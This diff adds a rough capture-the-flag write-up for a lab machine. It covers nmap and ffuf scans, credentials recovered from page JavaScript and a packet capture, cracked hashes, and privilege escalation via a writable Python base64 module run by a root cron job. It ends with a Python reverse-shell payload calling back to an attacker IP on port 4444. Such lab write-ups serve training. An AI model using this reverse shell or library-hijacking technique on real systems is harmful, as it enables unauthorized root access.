@@ -1,0 +1,145 @@
+## NMAP
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
+|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
+|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
+
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+
+37370/tcp open  ftp     vsftpd 3.0.3
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+
+
+## FFUF
+ffuf -u http://10.10.156.120/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.156.120/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+index.html              [Status: 200, Size: 1163, Words: 176, Lines: 39, Duration: 372ms]
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 263ms]
+.                       [Status: 200, Size: 1163, Words: 176, Lines: 39, Duration: 276ms]
+styles.css              [Status: 200, Size: 945, Words: 138, Lines: 53, Duration: 650ms]
+.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1793ms]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 507ms]
+.htm                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1586ms]
+.htpasswds              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1012ms]
+.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 431ms]
+.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 258ms]
+.htuser                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 321ms]
+:: Progress: [9851/16244] :: Job [1/1] :: 2 req/sec :: Duration: [0:04:15] :: Errors: 169 ::^[[A^[[A^[[A^[[A^[[A^[[A.htc                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]
+.ht                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 242ms]
+
+
+# FINDS::::
+:::::: on /static/00
+dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts
+
+On /dev1243224123123
+we find a login page:
+
+::::::::::
+Further we find after the Inspecting of page source and inspecting the js code:
+if (username === "siemDev" && password === "california") {
+        window.location.href = "/dev1243224123123/devNotes37370.txt";
+    } else {
+        loginErrorMsg.style.opacity = 1;
+    }
+::::::::::	
+dev notes for ftp server:
+-stop reusing credentials
+-check for any vulnerabilies
+-stay up to date on patching
+-change ftp port to normal port
+:::::::::::
+
+We try to explore vulnerabilities:
+but there is none exploitable on the login page:
+We will try to exploit :::  change ftp port to normal port
+
+
+ftp 10.10.23.31 37370    OR    ftp siemDev@<IP> -p <port>
+
+After getting the files from the ftp we find the credentials:
+
+kali@kali:~$ cat siemHTTP2.pcapng | strings |grep 'psw'
+:::::uname=valleyDev&psw=ph0t0s1234&remember=on
+
+We will use the ::"ssh":: 
+
+
+::::::WE FIND THAT ONE CRON TAB IS RUNNING EVERY MINUTE:
+WE NANO THE CRON TAB and FIND OUT THAT ITS NOT WRITABLE , BUT ITS IMPORTING THE BASE64 . 
+WE THEN uSE:
+find / -writable 2>/dev/null |grep python
+We fid all the files that are writable with our current account:
+but there is none:
+::::::AS WE DO NOT HAVE THE WRITE PERMISSION ON THE CRONTAB FILE WE WANT TO EXPLOIT WITH THE ACCOUNT WE HAVE WE WILL CHANGE TO "valley"ACCOUNT WE NOW FOUND::::
+
+
+
+For root Privileges we forund the application (BINARY)
+we will transfer the binary to out local computer , can umpack it:
+
+e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb
+D_HASH THEM: 
+liberty123
+valley
+
+Now we will try the cron tab and see if there is any writable we can find:
+
+valley@valley:~$ find / -writable 2>/dev/null |grep python
+/usr/lib/python3.8
+/usr/lib/python3.8/base64.py
+
+we found the base64.py that is being used in the cron tab, is writable :
+we can exploit it:::
+
+
+
+We can add the reverse shell on the script:
+:::: 
+import socket,subprocess,os
+
+def _reverse_shell():
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("10.21.129.108",4444))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        subprocess.call(["/bin/sh","-i"])
+    except:
+        pass
+_reverse_shell()
+:::::::
+
+add this to the base64.py
+and turn on the netcat listener:
+we will have our shell with root privelige.
